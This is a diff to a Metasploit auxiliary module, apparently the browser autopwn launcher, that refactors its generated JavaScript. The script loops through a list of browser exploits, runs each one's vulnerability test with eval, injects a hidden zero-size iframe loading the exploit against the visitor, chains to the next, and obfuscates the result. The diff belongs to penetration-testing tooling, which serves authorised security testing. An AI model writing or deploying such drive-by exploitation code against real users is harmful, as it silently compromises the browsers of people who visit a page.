@@ -706,7 +706,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Generic stuff that is needed regardless of what browser was detected.
 		js << <<-ENDJS
 			var written_iframes = new Array();
-			function write_iframe(myframe) {
+			window.write_iframe = function (myframe) {
 				var iframe_idx; var mybody;
 				for (iframe_idx in written_iframes) {
 					if (written_iframes[iframe_idx] == myframe) {
@@ -718,7 +718,7 @@ class Metasploit3 < Msf::Auxiliary
 				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
 				document.body.innerHTML += (str);
 			}
-			function next_exploit(exploit_idx) {
+			window.next_exploit = function (exploit_idx) {
 				#{js_debug("'next_exploit(' + exploit_idx +')'")}
 				if (!global_exploit_list[exploit_idx]) {
 					#{js_debug("'End'")}
@@ -745,15 +745,15 @@ class Metasploit3 < Msf::Auxiliary
 
 					if (eval(test)) {
 						#{js_debug("'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'")}
-						write_iframe(global_exploit_list[exploit_idx].resource);
-						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
+						window.write_iframe(global_exploit_list[exploit_idx].resource);
+						setTimeout("window.next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
 					} else {
 						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
-						next_exploit(exploit_idx+1);
+						window.next_exploit(exploit_idx+1);
 					}
 				} catch(e) {
 					#{js_debug("'test threw an exception: ' + e.message + '<br />'")}
-					next_exploit(exploit_idx+1);
+					window.next_exploit(exploit_idx+1);
 				};
 			}
 		ENDJS
@@ -832,8 +832,8 @@ class Metasploit3 < Msf::Auxiliary
 		js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
 		js << %Q|document.body.appendChild(noscript_div);\n|
 
-		js << "#{js_debug("'starting exploits<br>'")}\n"
-		js << "next_exploit(0);\n"
+		js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
+		js << "window.next_exploit(0);\n"
 
 		js = ::Rex::Exploitation::JSObfu.new(js)
 		js.obfuscate
